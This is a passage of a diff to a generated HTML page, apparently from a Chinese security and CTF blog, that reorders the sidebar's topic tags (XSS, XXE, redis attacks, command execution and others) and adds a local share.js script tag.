-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
         <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
@@ -2294,9 +2500,9 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
-        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
@@ -2304,25 +2510,27 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
     
-        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
-    
         <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
-        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
+        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
     
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
+    
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="变量覆盖漏洞"><span class="iconfont-archer">&#xe606;</span>变量覆盖漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
     
-        <span class="sidebar-tag-name" data-tags="远程代码执行"><span class="iconfont-archer">&#xe606;</span>远程代码执行</span>
+        <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
     
         <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
@@ -2347,8 +2555,6 @@ chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系�
         <span class="sidebar-tag-name" data-tags="零宽度字符"><span class="iconfont-archer">&#xe606;</span>零宽度字符</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
-    
-        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
     
         <span class="sidebar-tag-name" data-tags="PHP原生类"><span class="iconfont-archer">&#xe606;</span>PHP原生类</span>
     
@@ -2452,6 +2658,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
